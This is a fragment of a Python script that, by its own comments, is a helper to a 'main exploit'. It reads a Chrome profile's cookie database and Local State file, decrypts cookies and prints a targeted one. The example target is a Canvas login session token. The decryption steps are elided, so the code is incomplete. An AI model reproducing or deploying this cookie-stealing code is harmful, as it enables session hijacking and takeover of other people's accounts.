...
# This program is responsible for taking a chrome profile's cookie output and local state to output a specified cookie

# Replace the following with the exact profile cookies and local state file name outputted in the main exploit
cookie_file_name = "C:\\Users\\lando\\OneDrive\\Desktop\\Cookies1"
local_state_name = "C:\\Users\\lando\\OneDrive\\Desktop\\Local State"

# Replace with the cookie you want to find; this example includes the Canvas application login session token
...
for host_key, name, value, encrypted_value in cursor.fetchall():
  ...
  if name == COOKIE_NAME:
    print("Here's our cookie!:   {}".format(decrypted_value.decode("utf-8")))
